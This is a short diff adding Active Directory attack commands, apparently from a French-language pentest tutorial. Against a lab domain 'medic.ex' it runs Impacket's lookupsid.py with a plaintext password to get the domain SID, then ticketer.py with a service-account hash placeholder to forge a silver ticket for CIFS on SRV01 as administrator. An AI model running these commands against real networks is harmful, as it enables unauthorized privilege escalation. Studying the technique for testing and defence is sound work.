@@ -1,0 +1,5 @@
+$ lookupsid.py medic.ex/pixis:P4ssw0rd@dc01.medic.ex
+[...]
+[*] Domain SID is: S-1-5-21-3526105896-714836913-1342931244
+[...]
+$ ticketer.py -nthash <hash du compte de service> -domain-sid S-1-5-21-3526105896-714836913-1342931244 -domain medic.ex -spn CIFS/SRV01.medic.ex administrator
